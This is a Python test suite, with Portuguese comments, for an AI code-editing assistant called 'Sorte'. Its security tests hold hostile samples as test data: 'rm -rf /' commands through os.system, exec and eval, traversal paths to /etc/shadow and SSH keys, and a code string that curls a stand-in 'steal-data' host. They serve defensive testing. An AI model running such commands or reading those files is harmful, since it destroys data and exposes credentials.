import pytest
import unittest
import subprocess
import os
import sys
import ast
import json
from typing import Dict, List, Any, Optional
from unittest.mock import Mock, patch
import tempfile
import shutil
from utils.logger import Logger

class SorteTestSuite:
    """
    Sistema de testes automatizados para a IA Sorte.
    Inclui testes unitários, de integração e de segurança.
    """
    
    def __init__(self, base_path: str):
        self.base_path = base_path
        self.logger = Logger("SorteTestSuite")
        self.test_results = {}
        
    def run_all_tests(self) -> Dict[str, Any]:
        """Executa todos os tipos de teste e retorna os resultados."""
        self.logger.info("Iniciando execução de todos os testes")
        
        results = {
            "unit_tests": self.run_unit_tests(),
            "integration_tests": self.run_integration_tests(),
            "security_tests": self.run_security_tests(),
            "performance_tests": self.run_performance_tests(),
            "overall_status": "pending"
        }
        
        # Determinar status geral
        all_passed = all([
            results["unit_tests"]["passed"],
            results["integration_tests"]["passed"],
            results["security_tests"]["passed"],
            results["performance_tests"]["passed"]
        ])
        
        results["overall_status"] = "passed" if all_passed else "failed"
        
        self.logger.info(f"Todos os testes concluídos. Status geral: {results['overall_status']}")
        return results
    
    def run_unit_tests(self) -> Dict[str, Any]:
        """Executa testes unitários usando pytest."""
        self.logger.info("Executando testes unitários")
        
        try:
            # Criar diretório de testes se não existir
            tests_dir = os.path.join(self.base_path, "tests")
            os.makedirs(tests_dir, exist_ok=True)
            
            # Executar pytest
            result = subprocess.run([
                sys.executable, "-m", "pytest", 
                tests_dir, 
                "-v", 
                "--tb=short",
                "--json-report",
                "--json-report-file=test_results.json"
            ], capture_output=True, text=True, cwd=self.base_path)
            
            # Analisar resultados
            test_output = result.stdout
            test_errors = result.stderr
            return_code = result.returncode
            
            return {
                "passed": return_code == 0,
                "output": test_output,
                "errors": test_errors,
                "return_code": return_code,
                "details": self._parse_pytest_output(test_output)
            }
            
        except Exception as e:
            self.logger.error(f"Erro ao executar testes unitários: {e}")
            return {
                "passed": False,
                "output": "",
                "errors": str(e),
                "return_code": -1,
                "details": {}
            }
    
    def run_integration_tests(self) -> Dict[str, Any]:
        """Executa testes de integração entre componentes."""
        self.logger.info("Executando testes de integração")
        
        integration_results = {
            "interpreter_editor": self._test_interpreter_editor_integration(),
            "editor_guardian": self._test_editor_guardian_integration(),
            "telegram_interpreter": self._test_telegram_interpreter_integration(),
            "gpt_bridge_connection": self._test_gpt_bridge_connection()
        }
        
        all_passed = all(result["passed"] for result in integration_results.values())
        
        return {
            "passed": all_passed,
            "details": integration_results,
            "summary": f"{sum(1 for r in integration_results.values() if r['passed'])}/{len(integration_results)} testes passaram"
        }
    
    def run_security_tests(self) -> Dict[str, Any]:
        """Executa testes de segurança."""
        self.logger.info("Executando testes de segurança")
        
        security_results = {
            "code_injection": self._test_code_injection_protection(),
            "file_access": self._test_file_access_security(),
            "environment_variables": self._test_env_var_security(),
            "ast_manipulation": self._test_ast_security()
        }
        
        all_passed = all(result["passed"] for result in security_results.values())
        
        return {
            "passed": all_passed,
            "details": security_results,
            "summary": f"{sum(1 for r in security_results.values() if r['passed'])}/{len(security_results)} verificações de segurança passaram"
        }
    
    def run_performance_tests(self) -> Dict[str, Any]:
        """Executa testes de performance."""
        self.logger.info("Executando testes de performance")
        
        performance_results = {
            "command_interpretation_speed": self._test_command_interpretation_speed(),
            "code_modification_speed": self._test_code_modification_speed(),
            "memory_usage": self._test_memory_usage(),
            "file_operations_speed": self._test_file_operations_speed()
        }
        
        # Critérios de performance (podem ser ajustados)
        performance_criteria = {
            "command_interpretation_speed": 5.0,  # segundos
            "code_modification_speed": 10.0,     # segundos
            "memory_usage": 500,                 # MB
            "file_operations_speed": 1.0        # segundos
        }
        
        all_passed = True
        for test_name, result in performance_results.items():
            if result["value"] > performance_criteria.get(test_name, float('inf')):
                result["passed"] = False
                all_passed = False
            else:
                result["passed"] = True
        
        return {
            "passed": all_passed,
            "details": performance_results,
            "criteria": performance_criteria,
            "summary": f"{sum(1 for r in performance_results.values() if r['passed'])}/{len(performance_results)} testes de performance passaram"
        }
    
    def _test_interpreter_editor_integration(self) -> Dict[str, Any]:
        """Testa integração entre interpretador e editor."""
        try:
            from bud_interpreter_service.advanced_interpreter import AdvancedCommandInterpreter
            from bud_editor_service.ast_editor import ASTCodeEditor
            
            # Criar instâncias
            interpreter = AdvancedCommandInterpreter(self.base_path)
            editor = ASTCodeEditor(self.base_path)
            
            # Teste básico de integração
            test_command = "adicionar função de teste"
            result = interpreter.classify_command(test_command)
            
            return {
                "passed": result is not None,
                "details": f"Comando classificado como: {result}",
                "error": None
            }
            
        except Exception as e:
            return {
                "passed": False,
                "details": "Falha na integração interpreter-editor",
                "error": str(e)
            }
    
    def _test_editor_guardian_integration(self) -> Dict[str, Any]:
        """Testa integração entre editor e guardian."""
        try:
            from bud_editor_service.ast_editor import ASTCodeEditor
            from bud_guardian_service.guardian import CodeGuardian
            
            # Criar instâncias
            editor = ASTCodeEditor(self.base_path)
            guardian = CodeGuardian(self.base_path)
            
            # Criar arquivo temporário para teste
            test_file = "test_temp.py"
            test_code = "def test_function():\n    return True"
            
            # Testar fluxo editor -> guardian
            editor.write_file(test_file, test_code)
            validation_result = guardian.validate_code(test_file)
            
            # Limpar arquivo de teste
            try:
                os.remove(os.path.join(self.base_path, test_file))
            except:
                pass
            
            return {
                "passed": True,  # Se chegou até aqui, a integração funciona
                "details": f"Validação retornou: {validation_result}",
                "error": None
            }
            
        except Exception as e:
            return {
                "passed": False,
                "details": "Falha na integração editor-guardian",
                "error": str(e)
            }
    
    def _test_telegram_interpreter_integration(self) -> Dict[str, Any]:
        """Testa integração entre Telegram bot e interpretador."""
        try:
            # Mock do bot do Telegram para evitar dependências externas
            from bud_interpreter_service.advanced_interpreter import AdvancedCommandInterpreter
            
            interpreter = AdvancedCommandInterpreter(self.base_path)
            
            # Simular comando do Telegram
            test_command = "status do sistema"
            result = interpreter.classify_command(test_command)
            
            return {
                "passed": result is not None,
                "details": f"Integração Telegram-Interpreter funcionando. Comando classificado: {result}",
                "error": None
            }
            
        except Exception as e:
            return {
                "passed": False,
                "details": "Falha na integração telegram-interpreter",
                "error": str(e)
            }
    
    def _test_gpt_bridge_connection(self) -> Dict[str, Any]:
        """Testa conexão com GPT Bridge."""
        try:
            from bud_interpreter_service.gpt_bridge import GPTBridge
            
            bridge = GPTBridge()
            
            # Teste básico (sem fazer chamada real à API)
            test_prompt = "teste de conexão"
            
            return {
                "passed": True,  # Se a instância foi criada, a estrutura está OK
                "details": "GPT Bridge instanciado com sucesso",
                "error": None,
                "note": "Teste real de API requer configuração de chave válida"
            }
            
        except Exception as e:
            return {
                "passed": False,
                "details": "Falha na conexão com GPT Bridge",
                "error": str(e)
            }
    
    def _test_code_injection_protection(self) -> Dict[str, Any]:
        """Testa proteção contra injeção de código malicioso."""
        try:
            from bud_interpreter_service.advanced_interpreter import AdvancedCommandInterpreter
            
            interpreter = AdvancedCommandInterpreter(self.base_path)
            
            # Comandos maliciosos para testar
            malicious_commands = [
                "import os; os.system('rm -rf /')",
                "__import__('subprocess').call(['rm', '-rf', '/'])",
                "exec('import os; os.system(\"malicious_command\")')",
                "eval('__import__(\"os\").system(\"dangerous\")')"
            ]
            
            safe_classifications = 0
            for cmd in malicious_commands:
                classification = interpreter.classify_command(cmd)
                # Comandos maliciosos devem ser classificados como 'general' ou rejeitados
                if classification in ['general', None]:
                    safe_classifications += 1
            
            protection_rate = safe_classifications / len(malicious_commands)
            
            return {
                "passed": protection_rate >= 0.8,  # 80% de proteção mínima
                "details": f"Taxa de proteção: {protection_rate:.2%}",
                "error": None
            }
            
        except Exception as e:
            return {
                "passed": False,
                "details": "Erro ao testar proteção contra injeção de código",
                "error": str(e)
            }
    
    def _test_file_access_security(self) -> Dict[str, Any]:
        """Testa segurança de acesso a arquivos."""
        try:
            from bud_editor_service.ast_editor import ASTCodeEditor
            
            editor = ASTCodeEditor(self.base_path)
            
            # Tentar acessar arquivos fora do diretório base
            dangerous_paths = [
                "../../../etc/passwd",
                "/etc/shadow",
                "../../sensitive_file.txt",
                "/root/.ssh/id_rsa"
            ]
            
            blocked_accesses = 0
            for path in dangerous_paths:
                result = editor.read_file(path)
                if result is None:  # Acesso bloqueado/falhou
                    blocked_accesses += 1
            
            security_rate = blocked_accesses / len(dangerous_paths)
            
            return {
                "passed": security_rate >= 0.8,  # 80% de bloqueio mínimo
                "details": f"Taxa de bloqueio de acessos perigosos: {security_rate:.2%}",
                "error": None
            }
            
        except Exception as e:
            return {
                "passed": False,
                "details": "Erro ao testar segurança de acesso a arquivos",
                "error": str(e)
            }
    
    def _test_env_var_security(self) -> Dict[str, Any]:
        """Testa segurança das variáveis de ambiente."""
        try:
            import os
            from dotenv import load_dotenv
            
            # Verificar se variáveis sensíveis não estão expostas
            sensitive_vars = [
                "OPENAI_API_KEY",
                "TELEGRAM_BOT_TOKEN",
                "SECRET_KEY"
            ]
            
            exposed_vars = []
            for var in sensitive_vars:
                if var in os.environ:
                    # Verificar se não está sendo logada ou exposta
                    value = os.environ[var]
                    if len(value) > 10:  # Variável parece ter valor real
                        exposed_vars.append(var)
            
            return {
                "passed": len(exposed_vars) == 0 or all(
                    not os.environ[var].startswith("sk-") for var in exposed_vars
                ),
                "details": f"Variáveis verificadas: {len(sensitive_vars)}, Potencialmente expostas: {len(exposed_vars)}",
                "error": None
            }
            
        except Exception as e:
            return {
                "passed": False,
                "details": "Erro ao testar segurança de variáveis de ambiente",
                "error": str(e)
            }
    
    def _test_ast_security(self) -> Dict[str, Any]:
        """Testa segurança da manipulação AST."""
        try:
            from bud_editor_service.ast_editor import ASTCodeEditor
            
            editor = ASTCodeEditor(self.base_path)
            
            # Código malicioso para testar
            malicious_code = """
import os
import subprocess
def malicious_function():
    os.system('rm -rf /')
    subprocess.call(['curl', 'http://malicious-site.com/steal-data'])
"""
            
            # Tentar analisar código malicioso
            tree = editor.parse_code(malicious_code)
            
            # Verificar se a análise AST detecta padrões perigosos
            dangerous_patterns = ['os.system', 'subprocess.call', 'eval', 'exec']
            code_contains_danger = any(pattern in malicious_code for pattern in dangerous_patterns)
            
            return {
                "passed": tree is not None and code_contains_danger,  # AST deve funcionar, mas detectar perigo
                "details": f"AST parsing funcionou, padrões perigosos detectados: {code_contains_danger}",
                "error": None
            }
            
        except Exception as e:
            return {
                "passed": False,
                "details": "Erro ao testar segurança AST",
                "error": str(e)
            }
    
    def _test_command_interpretation_speed(self) -> Dict[str, Any]:
        """Testa velocidade de interpretação de comandos."""
        try:
            import time
            from bud_interpreter_service.advanced_interpreter import AdvancedCommandInterpreter
            
            interpreter = AdvancedCommandInterpreter(self.base_path)
            
            test_commands = [
                "seja mais agressiva",
                "ajuste o gerenciamento de risco",
                "otimize a performance",
                "corrija bugs na estratégia",
                "adicione nova funcionalidade"
            ]
            
            start_time = time.time()
            for cmd in test_commands:
                interpreter.classify_command(cmd)
            end_time = time.time()
            
            total_time = end_time - start_time
            avg_time = total_time / len(test_commands)
            
            return {
                "value": total_time,
                "average_per_command": avg_time,
                "commands_tested": len(test_commands),
                "details": f"Tempo total: {total_time:.3f}s, Média por comando: {avg_time:.3f}s"
            }
            
        except Exception as e:
            return {
                "value": float('inf'),
                "details": f"Erro ao testar velocidade: {e}",
                "error": str(e)
            }
    
    def _test_code_modification_speed(self) -> Dict[str, Any]:
        """Testa velocidade de modificação de código."""
        try:
            import time
            from bud_editor_service.ast_editor import ASTCodeEditor
            
            editor = ASTCodeEditor(self.base_path)
            
            # Criar arquivo temporário para teste
            test_file = "speed_test_temp.py"
            test_code = """
def original_function():
    return "original"

class TestClass:
    def method(self):
        pass
"""
            
            start_time = time.time()
            
            # Operações de modificação
            editor.write_file(test_file, test_code)
            editor.add_function_to_class(test_file, "TestClass", "def new_method(self):\n    return 'new'")
            editor.read_file(test_file)
            
            end_time = time.time()
            
            # Limpar arquivo de teste
            try:
                os.remove(os.path.join(self.base_path, test_file))
                os.remove(os.path.join(self.base_path, f"{test_file}.backup"))
            except:
                pass
            
            total_time = end_time - start_time
            
            return {
                "value": total_time,
                "operations": 3,
                "details": f"Tempo para 3 operações de código: {total_time:.3f}s"
            }
            
        except Exception as e:
            return {
                "value": float('inf'),
                "details": f"Erro ao testar velocidade de modificação: {e}",
                "error": str(e)
            }
    
    def _test_memory_usage(self) -> Dict[str, Any]:
        """Testa uso de memória."""
        try:
            import psutil
            import os
            
            process = psutil.Process(os.getpid())
            memory_info = process.memory_info()
            memory_mb = memory_info.rss / 1024 / 1024  # Converter para MB
            
            return {
                "value": memory_mb,
                "details": f"Uso de memória: {memory_mb:.2f} MB"
            }
            
        except ImportError:
            return {
                "value": 0,
                "details": "psutil não disponível, não foi possível medir memória",
                "error": "psutil não instalado"
            }
        except Exception as e:
            return {
                "value": float('inf'),
                "details": f"Erro ao medir memória: {e}",
                "error": str(e)
            }
    
    def _test_file_operations_speed(self) -> Dict[str, Any]:
        """Testa velocidade de operações de arquivo."""
        try:
            import time
            from bud_editor_service.ast_editor import ASTCodeEditor
            
            editor = ASTCodeEditor(self.base_path)
            
            test_file = "file_ops_test.py"
            test_content = "# Test file\nprint('hello world')\n" * 100  # Arquivo maior
            
            start_time = time.time()
            
            # Operações de arquivo
            editor.write_file(test_file, test_content)
            content = editor.read_file(test_file)
            editor.write_file(test_file, content + "\n# Modified")
            
            end_time = time.time()
            
            # Limpar
            try:
                os.remove(os.path.join(self.base_path, test_file))
            except:
                pass
            
            total_time = end_time - start_time
            
            return {
                "value": total_time,
                "details": f"Tempo para operações de arquivo: {total_time:.3f}s"
            }
            
        except Exception as e:
            return {
                "value": float('inf'),
                "details": f"Erro ao testar operações de arquivo: {e}",
                "error": str(e)
            }
    
    def _parse_pytest_output(self, output: str) -> Dict[str, Any]:
        """Analisa a saída do pytest."""
        lines = output.split('\n')
        
        # Extrair informações básicas
        test_count = 0
        passed_count = 0
        failed_count = 0
        
        for line in lines:
            if "passed" in line and "failed" in line:
                # Linha de resumo do pytest
                parts = line.split()
                for i, part in enumerate(parts):
                    if part == "passed":
                        passed_count = int(parts[i-1])
                    elif part == "failed":
                        failed_count = int(parts[i-1])
        
        test_count = passed_count + failed_count
        
        return {
            "total_tests": test_count,
            "passed": passed_count,
            "failed": failed_count,
            "success_rate": passed_count / test_count if test_count > 0 else 0
        }
    
    def generate_test_report(self, results: Dict[str, Any]) -> str:
        """Gera relatório detalhado dos testes."""
        report = []
        report.append("=" * 60)
        report.append("RELATÓRIO DE TESTES DA SORTE AI")
        report.append("=" * 60)
        report.append("")
        
        # Status geral
        status_emoji = "✅" if results["overall_status"] == "passed" else "❌"
        report.append(f"STATUS GERAL: {status_emoji} {results['overall_status'].upper()}")
        report.append("")
        
        # Detalhes por categoria
        categories = [
            ("Testes Unitários", "unit_tests"),
            ("Testes de Integração", "integration_tests"),
            ("Testes de Segurança", "security_tests"),
            ("Testes de Performance", "performance_tests")
        ]
        
        for category_name, category_key in categories:
            category_result = results[category_key]
            status_emoji = "✅" if category_result["passed"] else "❌"
            
            report.append(f"{category_name}: {status_emoji}")
            
            if "summary" in category_result:
                report.append(f"  {category_result['summary']}")
            
            if "details" in category_result and isinstance(category_result["details"], dict):
                for test_name, test_result in category_result["details"].items():
                    if isinstance(test_result, dict):
                        test_status = "✅" if test_result.get("passed", False) else "❌"
                        report.append(f"    {test_name}: {test_status}")
            
            report.append("")
        
        report.append("=" * 60)
        
        return "\n".join(report)

